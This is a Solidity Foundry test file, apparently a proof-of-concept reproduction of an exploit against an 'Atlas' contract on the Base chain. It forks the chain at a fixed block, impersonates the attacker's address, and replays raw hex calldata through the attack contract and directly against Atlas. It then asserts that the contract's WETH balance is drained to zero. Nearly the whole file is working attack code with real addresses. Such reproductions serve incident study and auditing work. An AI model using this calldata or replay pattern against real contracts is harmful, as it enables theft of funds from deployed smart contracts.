// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Atlas, IAtlas} from "../../src/bug/Atlas.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackAtlas2Test is Test {
    address constant atlas = 0x8CB5722179DE0860b0BcE7564b28523bba902D5c;
    address constant weth = 0x4200000000000000000000000000000000000006;
    uint256 constant blockNumber = 10446989;
    address constant hacker = 0x0a64eABc8f5049a0BDE336F79ec9087B98658B9C;
    address constant attack = 0x6d5E11a3810f88177Be46586b7cBd07229C61908;

    function setUp() external {
        vm.selectFork(vm.createFork(vm.envString("BASE_RPC_URL"), blockNumber));
    }

    function testAttack() external {
        console.log("Attack Before:");
        console.log("Atlas ewth:", IERC20(weth).balanceOf(atlas));

        _attack();

        console.log("Attack After:");
        console.log("Atlas ewth:", IERC20(weth).balanceOf(atlas));
        assertEq(IERC20(weth).balanceOf(atlas), 0);
    }

    function _attack() internal {
        vm.startPrank(hacker, hacker);
        bytes
            memory calldata_ = hex"f2afdff30000000000000000000000008cb5722179de0860b0bce7564b28523bba902d5c000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000020000000000000000000000004200000000000000000000000000000000000006000000000000000000000000484e9ab40b76826480bfe9d6455a135654401335";
        (bool success, ) = attack.call(calldata_);
        require(success, "call error");

        vm.stopPrank();
    }

    function testAttack2() external {
        vm.startPrank(hacker, hacker);
        bytes
            memory calldata_ = hex"246a496d000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe00000000000000000000000000000000000000000000000000000000000000020000000000000000000000006d5e11a3810f88177be46586b7cbd07229c619080000000000000000000000006d5e11a3810f88177be46586b7cbd07229c61908000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000200000000000000000000000042000000000000000000000000000000000000060000000000000000000000006d5e11a3810f88177be46586b7cbd07229c6190800000000000000000000000000000000000000000000000000000000000000020000000000000000000000006d5e11a3810f88177be46586b7cbd07229c619080000000000000000000000004200000000000000000000000000000000000006";
        (bool success, ) = atlas.call(calldata_);
        require(success, "call error");

        vm.stopPrank();
    }
}

// forge test --match-contract AttackAtlas2Test -vvv
